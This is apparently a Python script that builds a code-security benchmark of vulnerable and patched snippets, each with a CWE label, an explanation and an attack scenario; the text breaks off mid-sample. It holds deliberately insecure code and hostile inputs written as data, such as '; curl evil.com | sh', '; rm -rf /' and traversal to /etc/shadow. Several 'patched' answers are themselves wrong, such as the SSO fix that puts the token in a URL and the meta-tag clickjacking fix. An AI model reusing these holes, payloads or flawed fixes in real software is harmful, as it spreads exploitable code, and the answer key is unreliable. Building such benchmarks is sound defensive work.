"""Build a comprehensive 66-sample benchmark across 35+ CWE categories and 10+ languages.

Usage:
    python v2/benchmarks/build_comprehensive_benchmark.py

Outputs:
    v2/benchmarks/comprehensive_benchmark.jsonl  (66 samples)
"""
import json, hashlib, uuid
from pathlib import Path
from typing import Optional

OUT = Path(__file__).resolve().parent / "comprehensive_benchmark.jsonl"

def fp(data: dict) -> str:
    return hashlib.sha256(json.dumps(data, sort_keys=True).encode()).hexdigest()

def sample(lang: str, vuln: str, patch: str, cwe: str, sev: str, expl: str,
           attack: str, fix: str, vulnerable: bool = True, cve: Optional[str] = None,
           source: str = "comprehensive-benchmark") -> dict:
    uid = str(uuid.uuid4())[:8]
    s = {
        "id": f"CMP-{uid}",
        "language": lang,
        "vulnerable_code": vuln,
        "patched_code": patch,
        "cwe": cwe,
        "severity": sev,
        "explanation": expl,
        "attack_scenario": attack,
        "secure_fix": fix,
        "source": source,
        "source_license": "Apache-2.0",
        "cve": cve,
        "owasp": None,
        "cvss": None,
        "is_vulnerable": vulnerable,
        "split": "benchmark",
        "fingerprint": "",
        "added_at": "2026-07-18T00:00:00+00:00",
        "references": [cve] if cve else [],
    }
    s["fingerprint"] = fp(s)
    return s

samples = []

# ── CWE-22: Path Traversal ──────────────────────────────────────────
samples.append(sample(
    "python",
    "def read_report(filename):\n    path = '/var/reports/' + filename\n    with open(path) as f:\n        return f.read()",
    "import os\nBASE = '/var/reports/'\ndef read_report(filename):\n    path = os.path.normpath(os.path.join(BASE, filename))\n    if not path.startswith(BASE):\n        raise ValueError('invalid path')\n    with open(path) as f:\n        return f.read()",
    "CWE-22", "high",
    "User-supplied `filename` is concatenated directly into a file path without sanitization. An attacker can use `../` to escape the intended directory.",
    "An attacker submits `filename=../../etc/passwd` and reads the system password file.",
    "Normalize the path with `os.path.normpath` and verify it starts with the allowed base directory."))

samples.append(sample(
    "javascript",
    "app.get('/files/:name', (req, res) => {\n    const fs = require('fs');\n    const data = fs.readFileSync('/data/' + req.params.name);\n    res.send(data);\n});",
    "app.get('/files/:name', (req, res) => {\n    const path = require('path');\n    const fs = require('fs');\n    const safe = path.normalize('/data/' + req.params.name);\n    if (!safe.startsWith('/data/')) return res.status(403).send('bad path');\n    const data = fs.readFileSync(safe);\n    res.send(data);\n});",
    "CWE-22", "critical",
    "User-supplied filename parameter is concatenated into a file path without normalization.",
    "An attacker requests `/files/../../../etc/shadow` and reads the shadow password file.",
    "Normalize the resolved path and validate it stays within the allowed directory."))

# ── CWE-134: Format String ──────────────────────────────────────────
samples.append(sample(
    "c",
    "void log_error(const char* user_msg) {\n    char buf[256];\n    snprintf(buf, sizeof(buf), user_msg);\n    fprintf(stderr, \"%s\", buf);\n}",
    "void log_error(const char* user_msg) {\n    fprintf(stderr, \"%s\", user_msg);\n}",
    "CWE-134", "high",
    "Passing user-controlled input as the format string to `snprintf` lets an attacker read or write arbitrary memory via `%x`, `%n` specifiers.",
    "An attacker submits a message containing `%x%x%x%n` to read stack contents and corrupt memory.",
    "Never pass user input as a format string. Always use `\"%s\"` as the format and pass the string as a data argument."))

# ── CWE-476: Null Pointer Dereference ────────────────────────────────
samples.append(sample(
    "c",
    "void print_username(struct user* u) {\n    printf(\"username: %s\\n\", u->name);\n}",
    "void print_username(struct user* u) {\n    if (u == NULL || u->name == NULL) {\n        printf(\"username: (null)\\n\");\n        return;\n    }\n    printf(\"username: %s\\n\", u->name);\n}",
    "CWE-476", "medium",
    "The function dereferences `u` without checking if it's NULL. If `print_username` is called with a NULL pointer, the program crashes.",
    "An attacker triggers a code path that calls `print_username(NULL)`, causing denial of service via segmentation fault.",
    "Always null-check pointers before dereferencing them."))

# ── CWE-362: Race Condition (TOCTOU) ────────────────────────────────
samples.append(sample(
    "python",
    "import os, tempfile\ndef process_temp(data):\n    tmp = '/tmp/userdata.tmp'\n    with open(tmp, 'w') as f:\n        f.write(data)\n    os.chmod(tmp, 0o644)\n    result = os.popen('cat ' + tmp).read()\n    return result",
    "import tempfile, os, stat\ndef process_temp(data):\n    fd, tmp = tempfile.mkstemp()\n    try:\n        with os.fdopen(fd, 'w') as f:\n            f.write(data)\n        os.chmod(tmp, stat.S_IRUSR | stat.S_IWUSR)\n        result = open(tmp).read()\n    finally:\n        os.unlink(tmp)\n    return result",
    "CWE-362", "high",
    "A temp file is created with a predictable name, then used and modified. An attacker can create a symlink with the same name between the write and chmod calls (TOCTOU).",
    "An attacker creates a symlink `/tmp/userdata.tmp -> /etc/cron.d/evil`, causing the `chmod` or write to affect the wrong file.",
    "Use `tempfile.mkstemp()` for secure temporary files. Avoid predictable paths. Use atomic operations."))

samples.append(sample(
    "go",
    "func transfer(from, to string, amount int64) error {\n    bal, _ := getBalance(from)\n    if bal < amount { return errors.New(\"insufficient funds\") }\n    // TOCTOU window\n    return executeTransfer(from, to, amount)\n}",
    "func transfer(from, to string, amount int64) error {\n    return atomicTransfer(from, to, amount)\n}",
    "CWE-362", "high",
    "The balance check and transfer are not atomic. Another concurrent request can drain the account between the check and the transfer.",
    "An attacker sends two concurrent withdrawal requests; both pass the balance check before either deducts.",
    "Use database transactions or compare-and-swap operations to make the check-and-deduct atomic."))

# ── CWE-400: Uncontrolled Resource Consumption ──────────────────────
samples.append(sample(
    "python",
    "from flask import request\n@app.route('/echo')\ndef echo():\n    data = request.data\n    return data",
    "from flask import request\nMAX_SIZE = 1024 * 1024  # 1MB\n@app.route('/echo')\ndef echo():\n    data = request.data\n    if len(data) > MAX_SIZE:\n        return 'payload too large', 413\n    return data",
    "CWE-400", "medium",
    "The endpoint accepts arbitrarily large request bodies, allowing an attacker to exhaust server memory.",
    "An attacker sends multiple concurrent requests with multi-gigabyte payloads, causing OOM kills.",
    "Limit request body size with `request.max_content_length` or explicit length checks."))

samples.append(sample(
    "javascript",
    "app.post('/expand', (req, res) => {\n    const result = req.body.input.replace(/a+/g, m => m.repeat(100));\n    res.send(result);\n});",
    "app.post('/expand', (req, res) => {\n    const input = req.body.input;\n    if (typeof input !== 'string' || input.length > 1000) {\n        return res.status(413).send('too long');\n    }\n    const result = input.replace(/a+/g, m => m.repeat(100));\n    res.send(result);\n});",
    "CWE-400", "medium",
    "An unvalidated regex replacement with exponential expansion can cause CPU or memory exhaustion.",
    "An attacker sends a 10KB string of `a` characters; the replacement expands output to megabytes.",
    "Validate input length limits before processing. Set context-level timeouts for regex operations."))

# ── CWE-312: Cleartext Storage of Sensitive Data ────────────────────
samples.append(sample(
    "python",
    "import logging\nlogging.basicConfig(level=logging.INFO)\ndef login(user, pw):\n    logging.info(f'Login attempt: user={user} password={pw}')\n    return check_auth(user, pw)",
    "import logging\nlogging.basicConfig(level=logging.INFO)\ndef login(user, pw):\n    logging.info(f'Login attempt: user={user}')\n    return check_auth(user, pw)",
    "CWE-312", "high",
    "The password is logged in cleartext. Anyone with log access (splunk, logtail, SIEM) can read user passwords.",
    "An attacker who gains read access to log files extracts plaintext passwords from login entries.",
    "Never log passwords or secrets. Log only non-sensitive metadata like username and timestamp."))

# ── CWE-276: Incorrect Default Permissions ──────────────────────────
samples.append(sample(
    "go",
    "package main\nimport \"os\"\nfunc saveConfig(path string, data []byte) error {\n    return os.WriteFile(path, data, 0666)\n}",
    "func saveConfig(path string, data []byte) error {\n    return os.WriteFile(path, data, 0600)\n}",
    "CWE-276", "high",
    "The config file is created with world-readable permissions (0666), exposing secrets to any local user.",
    "A low-privileged user on the system reads `/etc/app/config.json` and extracts database credentials.",
    "Set restrictive permissions (0600 or 0640) on files containing secrets or configuration."))

# ── CWE-377: Insecure Temporary File ────────────────────────────────
samples.append(sample(
    "python",
    "import os\ndef save_upload(data):\n    path = '/tmp/upload_' + str(os.getpid())\n    with open(path, 'w') as f:\n        f.write(data)\n    process_file(path)\n    os.unlink(path)",
    "import tempfile\ndef save_upload(data):\n    fd, path = tempfile.mkstemp(prefix='upload_')\n    with os.fdopen(fd, 'w') as f:\n        f.write(data)\n    try:\n        process_file(path)\n    finally:\n        os.unlink(path)",
    "CWE-377", "high",
    "The temporary file is created with a predictable name. An attacker can create a symlink with that name before the file is opened (symlink race).",
    "An attacker pre-creates `/tmp/upload_1234 -> /etc/important/file`; the application writes upload data to the wrong file.",
    "Use `tempfile.mkstemp()` or `tempfile.NamedTemporaryFile()` for secure temp file creation."))

# ── CWE-732: Incorrect Permission Assignment ────────────────────────
samples.append(sample(
    "python",
    "import os\nos.makedirs('/app/data/reports', exist_ok=True)\nwith open('/app/data/reports/summary.txt', 'w') as f:\n    f.write('quarterly report')",
    "import os\nos.makedirs('/app/data/reports', mode=0o750, exist_ok=True)\nwith open('/app/data/reports/summary.txt', 'w') as f:\n    os.fchmod(f.fileno(), 0o640)\n    f.write('quarterly report')",
    "CWE-732", "medium",
    "The directory and file are created with default permissions (often 0777 or 0666 minus umask). Other users on the system can read sensitive business reports.",
    "A coworker with a shared shell account reads quarterly financial reports before they are published.",
    "Set explicit permissions on created directories and files. Use `os.makedirs(mode=...)` and `os.fchmod`."))

# ── CWE-835: Infinite Loop ─────────────────────────────────────────
samples.append(sample(
    "c",
    "int parse_message(const char* data) {\n    int pos = 0;\n    while (data[pos] != '\\0') {\n        if (data[pos] == '\\\\') {\n            pos += 2;\n        }\n        pos++;\n    }\n    return pos;\n}",
    "int parse_message(const char* data, size_t len) {\n    size_t pos = 0;\n    while (pos < len) {\n        if (data[pos] == '\\\\' && pos + 1 < len) {\n            pos += 2;\n        } else {\n            pos++;\n        }\n    }\n    return (int)pos;\n}",
    "CWE-835", "medium",
    "If the input ends with a single backslash, `pos += 2` skips past the null terminator, reading uninitialized memory and potentially looping forever.",
    "An attacker sends a message ending with `\\`, causing CPU spin and denial of service.",
    "Pass buffer length explicitly and check bounds before every access."))

# ── CWE-117: Log Injection ──────────────────────────────────────────
samples.append(sample(
    "python",
    "import logging\ndef login(user):\n    logging.info(f'User {user} logged in')\n    return True",
    "import logging\ndef sanitize(s):\n    return s.replace('\\n', '').replace('\\r', '')\ndef login(user):\n    logging.info(f'User {sanitize(user)} logged in')\n    return True",
    "CWE-117", "medium",
    "User-controlled text is written to logs without sanitizing newlines. An attacker can inject fake log entries.",
    "An attacker submits username `admin\\n[INFO] Authentication successful for user admin` to cover tracks or poison log analysis.",
    "Strip or escape newline characters and other control characters before writing user input to logs."))

# ── CWE-640: Weak Password Recovery ─────────────────────────────────
samples.append(sample(
    "python",
    "import secrets, smtplib\ndef reset_password(email):\n    token = str(hash(email + str(secrets.token_bytes(4))))\n    send_email(email, f'Your reset token: {token}')\n    return token",
    "import secrets\ndef reset_password(email):\n    token = secrets.token_urlsafe(32)\n    store_token(email, token)\n    send_email(email, f'Use this link to reset: https://example.com/reset?token={token}')\n    return token",
    "CWE-640", "high",
    "The reset token uses an insecure `hash()` which is deterministic per Python process and subject to hash collisions. A 4-byte random seed (32 bits) is trivially brute-forceable.",
    "An attacker enumerates emails, brute-forces the 32-bit token space, and resets any account's password.",
    "Use `secrets.token_urlsafe(32)` for at least 256 bits of entropy. Never use Python's `hash()` for security tokens."))

# ── CWE-307: Improper Restriction of Auth Attempts ──────────────────
samples.append(sample(
    "python",
    "from flask import request\n@app.route('/login', methods=['POST'])\ndef login():\n    user = request.form['user']\n    pw = request.form['pass']\n    if check_password(user, pw):\n        return 'ok'\n    return 'bad', 401",
    "from flask import request\nfrom collections import defaultdict\nimport time\nattempts = defaultdict(list)\nMAX_ATTEMPTS = 5\nWINDOW = 300  # 5 min\n@app.route('/login', methods=['POST'])\ndef login():\n    ip = request.remote_addr\n    now = time.time()\n    attempts[ip] = [t for t in attempts[ip] if now - t < WINDOW]\n    if len(attempts[ip]) >= MAX_ATTEMPTS:\n        return 'too many attempts', 429\n    user = request.form['user']\n    pw = request.form['pass']\n    if check_password(user, pw):\n        return 'ok'\n    attempts[ip].append(now)\n    return 'bad', 401",
    "CWE-307", "high",
    "No rate limiting on login. An attacker can brute-force passwords at full speed with no lockout threshold.",
    "An attacker tries 10,000 passwords per minute against the login endpoint until one succeeds.",
    "Implement rate limiting per IP and/or per user. Lock accounts after N failed attempts within a window."))

# ── CWE-259: Hardcoded Password ─────────────────────────────────────
samples.append(sample(
    "javascript",
    "const mysql = require('mysql');\nconst conn = mysql.createConnection({\n    host: 'localhost',\n    user: 'root',\n    password: 'P@ssw0rd!'\n});",
    "const mysql = require('mysql');\nconst conn = mysql.createConnection({\n    host: process.env.DB_HOST,\n    user: process.env.DB_USER,\n    password: process.env.DB_PASS\n});",
    "CWE-259", "critical",
    "Database password is hardcoded in source code. Anyone with repo access can read production database credentials.",
    "A developer commits code to a public GitHub repo; attackers scan for the hardcoded password and compromise the database.",
    "Store secrets in environment variables or a secrets manager like HashiCorp Vault."))

# ── CWE-522: Insufficiently Protected Credentials ──────────────────
samples.append(sample(
    "python",
    "import base64\ndef transmit_creds(user, pw):\n    encoded = base64.b64encode(f'{user}:{pw}'.encode())\n    requests.post('https://api.example.com/auth', data={'creds': encoded})",
    "import requests\ndef transmit_creds(user, pw):\n    resp = requests.post('https://api.example.com/auth',\n        auth=(user, pw),\n        verify=True)\n    return resp",
    "CWE-522", "high",
    "Base64 encoding is not encryption. Any attacker with network access can decode the credentials in transit. Base64 is trivially reversible.",
    "An attacker on a shared WiFi network captures the HTTPS traffic (or if HTTP, reads the plaintext base64) and decodes the credentials.",
    "Use proper TLS with HTTP Basic Auth or a secure token exchange protocol. Never use base64 as a security mechanism."))

# ── CWE-523: Unprotected Transport of Credentials ──────────────────
samples.append(sample(
    "python",
    "import requests\ndef login_api(user, pw):\n    return requests.post('http://api.example.com/login', data={'user': user, 'pass': pw})",
    "def login_api(user, pw):\n    return requests.post('https://api.example.com/login', json={'user': user, 'pass': pw}, verify=True)",
    "CWE-523", "critical",
    "Credentials are sent over unencrypted HTTP. Anyone on the network path can sniff the plaintext password.",
    "An attacker with access to a router or WiFi access point captures the HTTP POST body and collects user credentials.",
    "Always use HTTPS with valid TLS certificates. Never transmit credentials over plain HTTP."))

# ── CWE-613: Insufficient Session Expiration ───────────────────────
samples.append(sample(
    "python",
    "from flask import Flask, session\napp = Flask(__name__)\napp.config['PERMANENT_SESSION_LIFETIME'] = 365 * 24 * 3600  # 1 year",
    "app.config['PERMANENT_SESSION_LIFETIME'] = 3600  # 1 hour\napp.config['SESSION_PERMANENT'] = True",
    "CWE-613", "medium",
    "Sessions last for 365 days. If a user's device is lost/stolen, or they forget to log out on a shared computer, anyone can access their account for a full year.",
    "An attacker finds an active session cookie on a shared computer and uses it to access the account months later.",
    "Set session lifetimes to 1-24 hours for most applications. Provide a 'log out everywhere' feature that rotates the session key."))

# ── CWE-284: Improper Access Control ────────────────────────────────
samples.append(sample(
    "python",
    "from flask import request\n@app.route('/api/admin/delete_user')\ndef admin_delete_user():\n    uid = request.args.get('uid')\n    db.execute('DELETE FROM users WHERE id = ?', [uid])\n    return 'deleted'",
    "from flask import request, session\n@app.route('/api/admin/delete_user')\ndef admin_delete_user():\n    if not session.get('is_admin'):\n        return 'forbidden', 403\n    uid = request.args.get('uid')\n    db.execute('DELETE FROM users WHERE id = ?', [uid])\n    return 'deleted'",
    "CWE-284", "critical",
    "The admin endpoint has no authorization check. Any authenticated user (or even unauthenticated user if no auth middleware) can delete arbitrary users.",
    "An attacker calls `/api/admin/delete_user?uid=admin` and deletes the administrator account, locking everyone out.",
    "Check user role/permissions on every admin-facing endpoint. Use decorators or middleware to enforce access control."))

# ── CWE-285: Improper Authorization ────────────────────────────────
samples.append(sample(
    "go",
    "func EditDoc(w http.ResponseWriter, r *http.Request) {\n    id := r.URL.Query().Get(\"id\")\n    doc, _ := getDoc(id)\n    json.NewEncoder(w).Encode(doc)\n}",
    "func EditDoc(w http.ResponseWriter, r *http.Request) {\n    userID := r.Context().Value(\"user\").(string)\n    id := r.URL.Query().Get(\"id\")\n    doc, err := getDoc(id)\n    if err != nil || doc.OwnerID != userID {\n        http.Error(w, \"not found\", 404)\n        return\n    }\n    json.NewEncoder(w).Encode(doc)\n}",
    "CWE-285", "high",
    "The handler doesn't verify the user owns the document. Any user can edit any document by guessing or enumerating IDs.",
    "An attacker iterates `?id=doc-001` through `doc-999`, editing and corrupting other users' documents.",
    "Check that the authenticated user is the owner of the resource before allowing modifications."))

# ── CWE-703: Improper Check for Unusual Conditions ─────────────────
samples.append(sample(
    "c",
    "int divide(int a, int b) {\n    return a / b;\n}",
    "int divide(int a, int b) {\n    if (b == 0) {\n        return 0;  // or handle error\n    }\n    return a / b;\n}",
    "CWE-703", "medium",
    "Division by zero is not checked, causing a crash (SIGFPE) if `b` is zero.",
    "An attacker supplies `b=0` as input, crashing the service and causing denial of service.",
    "Always check divisor for zero before division."))

# ── CWE-311: Missing Encryption of Sensitive Data ──────────────────
samples.append(sample(
    "python",
    "import sqlite3\ndef store_ssn(uid, ssn):\n    db.execute('INSERT INTO personal_data VALUES (?, ?)', [uid, ssn])",
    "from cryptography.fernet import Fernet\nkey = Fernet.generate_key()\ncipher = Fernet(key)\ndef store_ssn(uid, ssn):\n    encrypted = cipher.encrypt(ssn.encode())\n    db.execute('INSERT INTO personal_data VALUES (?, ?)', [uid, encrypted])",
    "CWE-311", "high",
    "Social Security Numbers (SSNs) are stored in cleartext. If the database is breached, all SSNs are immediately exposed.",
    "An attacker SQL-injects or steals a database backup, extracting millions of plaintext SSNs.",
    "Encrypt sensitive PII at rest using strong encryption (AES-256-GCM) with key rotation."))

# ── CWE-326: Inadequate Encryption Strength ─────────────────────────
samples.append(sample(
    "python",
    "from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes\nimport os\nkey = os.urandom(8)  # 64-bit key\ndef encrypt(data):\n    iv = os.urandom(8)\n    cipher = Cipher(algorithms.Blowfish(key), modes.CBC(iv))\n    encryptor = cipher.encryptor()\n    return iv + encryptor.update(data) + encryptor.finalize()",
    "from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes\nkey = os.urandom(32)  # 256-bit key\ndef encrypt(data):\n    iv = os.urandom(12)\n    cipher = Cipher(algorithms.AES(key), modes.GCM(iv))\n    encryptor = cipher.encryptor()\n    ct = encryptor.update(data) + encryptor.finalize()\n    return iv + encryptor.tag + ct",
    "CWE-326", "high",
    "A 64-bit Blowfish key offers only 56-bit effective security (DES-level). Blowfish is outdated and vulnerable to SWEET32 attacks on CBC mode. 64-bit keys can be brute-forced with cloud resources.",
    "An attacker captures ciphertexts and brute-forces the 56-bit keyspace to decrypt sensitive data.",
    "Use AES-256-GCM (or ChaCha20-Poly1305) with a 256-bit key. Use authenticated encryption to prevent tampering."))

# ── CWE-770: Allocation Without Limits ─────────────────────────────
samples.append(sample(
    "javascript",
    "app.post('/store', (req, res) => {\n    const items = [];\n    req.on('data', chunk => items.push(chunk));\n    req.on('end', () => {\n        const big = Buffer.concat(items);\n        res.send('stored ' + big.length);\n    });\n});",
    "app.post('/store', (req, res) => {\n    let total = 0;\n    const MAX = 10 * 1024 * 1024;\n    const items = [];\n    req.on('data', chunk => {\n        total += chunk.length;\n        if (total > MAX) {\n            req.destroy();\n            return res.status(413).send('too large');\n        }\n        items.push(chunk);\n    });\n    req.on('end', () => res.send('stored ' + total));\n});",
    "CWE-770", "medium",
    "Unbounded memory allocation: an attacker can send an arbitrarily large request body, causing OOM.",
    "An attacker sends a 2GB POST body; the server exhausts all available RAM and crashes.",
    "Cap total accepted request size. Use streaming or temp-file-backed buffering for large payloads."))

# ── CWE-379: Creation of Temp File in Insecure Dir ──────────────────
samples.append(sample(
    "python",
    "import tempfile\nfd, path = tempfile.mkstemp(dir='/tmp')\nwith os.fdopen(fd, 'w') as f:\n    f.write('sensitive')",
    "import tempfile\nfd, path = tempfile.mkstemp(dir='/app/secure_tmp')\nos.chmod(path, 0o600)\nwith os.fdopen(fd, 'w') as f:\n    f.write('sensitive')",
    "CWE-379", "medium",
    "Temp file is created in a world-readable directory (/tmp). Any local user can read the sensitive content.",
    "Another user on the same machine reads the temp file's contents during processing.",
    "Create temp files in a directory with restricted permissions. Set file permissions explicitly."))

# ── CWE-754: Improper Check for Exceptional Conditions ─────────────
samples.append(sample(
    "go",
    "func loadConfig(path string) string {\n    data, _ := os.ReadFile(path)\n    return string(data)\n}",
    "func loadConfig(path string) (string, error) {\n    data, err := os.ReadFile(path)\n    if err != nil {\n        return \"\", fmt.Errorf(\"config load failed: %w\", err)\n    }\n    return string(data), nil\n}",
    "CWE-754", "medium",
    "The error from `ReadFile` is silently ignored with `_`. If the file doesn't exist or can't be read, the function returns an empty string, which may cause downstream issues.",
    "A missing config file returns empty data, potentially disabling security features without warning.",
    "Always check and handle errors. Fail fast if critical resources are unavailable."))

# ── CWE-1021: Clickjacking ──────────────────────────────────────────
samples.append(sample(
    "html",
    "<html>\n<head><title>Bank App</title></head>\n<body>\n  <form action='/transfer' method='POST'>\n    <input name='amount' value='0'>\n    <input type='submit' value='Submit'>\n  </form>\n</body>\n</html>",
    "<html>\n<head>\n  <title>Bank App</title>\n  <meta http-equiv='X-Frame-Options' content='DENY'>\n  <style>body { display: none; }</style>\n</head>\n<body>\n  <form action='/transfer' method='POST'>\n    <input name='amount' value='0'>\n    <input type='submit' value='Submit'>\n  </form>\n</body>\n</html>",
    "CWE-1021", "medium",
    "No frame-busting header or CSP frame-ancestors directive. An attacker can embed the bank page in a transparent iframe and trick the user into clicking a transfer button (clickjacking).",
    "An attacker hosts a 'game' page with an invisible iframe pointing to `bank.com/transfer`; the victim clicks and unknowingly transfers money.",
    "Set `X-Frame-Options: DENY` or `Content-Security-Policy: frame-ancestors 'none'` HTTP headers."))

# ── CWE-404: Improper Resource Shutdown ─────────────────────────────
samples.append(sample(
    "java",
    "import java.sql.*;\npublic class Database {\n    public ResultSet query(String sql) throws SQLException {\n        Connection conn = DriverManager.getConnection(\"jdbc:h2:mem:test\");\n        Statement stmt = conn.createStatement();\n        return stmt.executeQuery(sql);\n    }\n}",
    "public class Database implements AutoCloseable {\n    private Connection conn;\n    public Database() throws SQLException {\n        conn = DriverManager.getConnection(\"jdbc:h2:mem:test\");\n    }\n    public ResultSet query(String sql) throws SQLException {\n        return conn.createStatement().executeQuery(sql);\n    }\n    public void close() throws SQLException {\n        if (conn != null) conn.close();\n    }\n}",
    "CWE-404", "high",
    "A new connection is opened on every query and never closed, exhausting the database connection pool until the server rejects new connections.",
    "After enough queries, the database runs out of connections, causing denial of service for all users.",
    "Use a connection pool with proper release-on-close semantics. Always close connections in `finally` blocks or use try-with-resources."))

# ── CWE-682: Incorrect Calculation (Smart Contract) ────────────────
samples.append(sample(
    "solidity",
    "pragma solidity ^0.8.0;\ncontract Auction {\n    uint public highestBid;\n    address public highestBidder;\n    function bid() public payable {\n        require(msg.value > highestBid);\n        payable(highestBidder).transfer(highestBid);\n        highestBid = msg.value;\n        highestBidder = msg.sender;\n    }\n}",
    "contract Auction {\n    uint public highestBid;\n    address public highestBidder;\n    mapping(address => uint) public refunds;\n    function bid() public payable {\n        require(msg.value > highestBid);\n        if (highestBidder != address(0)) {\n            refunds[highestBidder] += highestBid;\n        }\n        highestBid = msg.value;\n        highestBidder = msg.sender;\n    }\n    function withdrawRefund() public {\n        uint amount = refunds[msg.sender];\n        refunds[msg.sender] = 0;\n        payable(msg.sender).transfer(amount);\n    }\n}",
    "CWE-682", "high",
    "The auction contract sends ETH back to the previous highest bidder using `.transfer()` before updating state. If the recipient is a contract that reverts, the auction breaks (re-entrancy vulnerability).",
    "An attacker deploys a contract that reverts on ETH receive, forcing the auction to fail and preventing anyone from outbidding them.",
    "Follow the checks-effects-interactions pattern: update state before sending ETH. Use a pull-over-push withdrawal pattern."))

# ── CWE-664: Improper Control of a Resource ─────────────────────────
samples.append(sample(
    "go",
    "import \"os/exec\"\nfunc runScript(path string) {\n    cmd := exec.Command(\"/bin/sh\", \"-c\", path)\n    cmd.Run()\n}",
    "func runScript(path string) {\n    cmd := exec.Command(path)\n    cmd.Run()\n}",
    "CWE-664", "critical",
    "Using `sh -c` with a user-controlled path allows command injection via shell metacharacters in the file path (e.g., a file named `; rm -rf /`).",
    "An attacker creates a file named `; curl evil.com | sh` and triggers this function, executing arbitrary commands.",
    "Avoid `sh -c` when invoking external programs. Use `exec.Command` with the program path directly and pass arguments separately."))

# ── CWE-799: Improper Control of Interaction Frequency ──────────────
samples.append(sample(
    "python",
    "from flask import request\n@app.route('/api/search')\ndef search():\n    q = request.args.get('q', '')\n    results = db.execute('SELECT * FROM items WHERE name LIKE ?', [f'%{q}%'])\n    return {'results': [dict(r) for r in results]}",
    "from flask import request\nfrom collections import defaultdict\nimport time\nRATE_LIMIT = defaultdict(list)\n@app.route('/api/search')\ndef search():\n    ip = request.remote_addr\n    now = time.time()\n    RATE_LIMIT[ip] = [t for t in RATE_LIMIT[ip] if now - t < 1]\n    if len(RATE_LIMIT[ip]) >= 10:\n        return {'error': 'rate limited'}, 429\n    RATE_LIMIT[ip].append(now)\n    q = request.args.get('q', '')\n    if len(q) > 200:\n        return {'error': 'query too long'}, 413\n    results = db.execute('SELECT * FROM items WHERE name LIKE ?', [f'%{q}%'])\n    return {'results': [dict(r) for r in results]}",
    "CWE-799", "low",
    "No rate limiting on the search endpoint. An attacker can hammer the database with thousands of expensive LIKE queries per second, causing CPU exhaustion.",
    "An attacker sends 10,000 search requests simultaneously, consuming all database connections and killing site performance.",
    "Implement per-IP rate limiting. Set query length and result count limits. Use pagination."))

# ── CWE-400: Zip Bomb / Uncontrolled Resource (alt) ────────────────
samples.append(sample(
    "python",
    "import zipfile\ndef extract_zip(path, outdir):\n    with zipfile.ZipFile(path) as zf:\n        zf.extractall(outdir)",
    "import zipfile, os\ndef extract_zip(path, outdir):\n    MAX_SIZE = 100 * 1024 * 1024  # 100 MB\n    with zipfile.ZipFile(path) as zf:\n        total = sum(fi.file_size for fi in zf.infolist())\n        if total > MAX_SIZE:\n            raise ValueError('archive too large')\n        for fi in zf.infolist():\n            dest = os.path.normpath(os.path.join(outdir, fi.filename))\n            if not dest.startswith(os.path.normpath(outdir)):\n                raise ValueError('path traversal in zip')\n            if fi.file_size > MAX_SIZE // len(zf.infolist()):\n                raise ValueError('file too large')\n        zf.extractall(outdir)",
    "CWE-400", "high",
    "The zip extractor doesn't check total decompressed size. A zip bomb (e.g., 42KB compressed -> 4.5PB decompressed) fills the disk and crashes the server.",
    "An attacker uploads a zip bomb; the server runs out of disk space, causing denial of service.",
    "Check total decompressed size before extraction. Validate file paths to prevent zip slip. Limit individual file sizes."))

# ── CWE-522: SSO Token Leakage ─────────────────────────────────────
samples.append(sample(
    "javascript",
    "app.get('/callback', (req, res) => {\n    const token = req.query.token;\n    console.log('SSO token:', token);\n    res.send('authenticated');\n});",
    "app.get('/callback', (req, res) => {\n    const token = req.query.token;\n    res.redirect('/dashboard?session=' + token);\n});",
    "CWE-522", "high",
    "SSO tokens are logged to console. Anyone with access to server logs (log aggregation, monitoring) can steal tokens and impersonate users.",
    "An attacker gains read access to CloudWatch/DataDog logs and extracts SSO tokens for several users.",
    "Never log authentication tokens, session IDs, or secrets. Mask or omit sensitive parameters in logs."))

# ── CWE-117: Log Injection (Java variant) ──────────────────────────
samples.append(sample(
    "java",
    "import java.util.logging.*;\npublic class AuthLogger {\n    Logger log = Logger.getLogger(\"Auth\");\n    public void logLogin(String user) {\n        log.info(\"Login: \" + user);\n    }\n}",
    "public class AuthLogger {\n    Logger log = Logger.getLogger(\"Auth\");\n    public void logLogin(String user) {\n        String safe = user.replaceAll(\"[\\n\\r]\", \"_\");\n        log.info(\"Login: \" + safe);\n    }\n}",
    "CWE-117", "medium",
    "User-controlled input from the username is directly concatenated into log output. CRLF injection allows log forgery.",
    "An attacker logs in with username `admin\\n[INFO] Access granted to admin`, injecting fake log entries to cover their tracks.",
    "Sanitize log inputs by removing or encoding CRLF characters before writing to logs."))

# ── CWE-613: Session Fixation ──────────────────────────────────────
samples.append(sample(
    "python",
    "from flask import Flask, session, request\napp = Flask(__name__)\n@app.route('/login', methods=['POST'])\ndef login():\n    session['user'] = request.form['user']\n    return 'logged in'\n@app.route('/set_session')\ndef set_session():\n    # Accepts arbitrary session IDs\n    session.sid = request.args.get('sid', session.sid)\n    return 'ok'",
    "@app.route('/login', methods=['POST'])\ndef login():\n    session.clear()\n    session.regenerate()\n    session['user'] = request.form['user']\n    return 'logged in'",
    "CWE-613", "high",
    "The application accepts externally-set session IDs (via URL parameter `sid`). An attacker can fixate a known session ID, then trick the victim into authenticating with it.",
    "The attacker sends a link `https://bank.com/login?sid=known123`, the victim logs in, and the attacker uses `known123` to hijack the session.",
    "Regenerate session IDs after login. Never accept session IDs from URL parameters. Use secure, random session IDs generated server-side."))

# ── CLEAN samples (non-vulnerable) ──────────────────────────────────
samples.append(sample(
    "python",
    "from flask import Flask, request\nfrom markupsafe import escape\napp = Flask(__name__)\n@app.route('/hello')\ndef hello():\n    name = escape(request.args.get('name', 'world'))\n    return f'<h1>Hello {name}</h1>'",
    "",
    "CWE-000", "none",
    "This code properly escapes user input with `markupsafe.escape` before rendering in HTML, preventing XSS.",
    "N/A — no vulnerability",
    "No fix needed: the code already handles XSS correctly.", vulnerable=False))

samples.append(sample(
    "c",
    "#include <string.h>\n#include <stdio.h>\nvoid process(const char* input, size_t len) {\n    if (len >= 64) return;\n    char buf[64];\n    strncpy(buf, input, len);\n    buf[len] = '\\0';\n    printf(\"%s\\n\", buf);\n}",
    "",
    "CWE-000", "none",
    "This code safely bounds-checks input length before copying into a fixed buffer using `strncpy` with explicit null termination.",
    "N/A — no vulnerability",
    "No fix needed: bounds checking and safe copy functions are already used.", vulnerable=False))

samples.append(sample(
    "javascript",
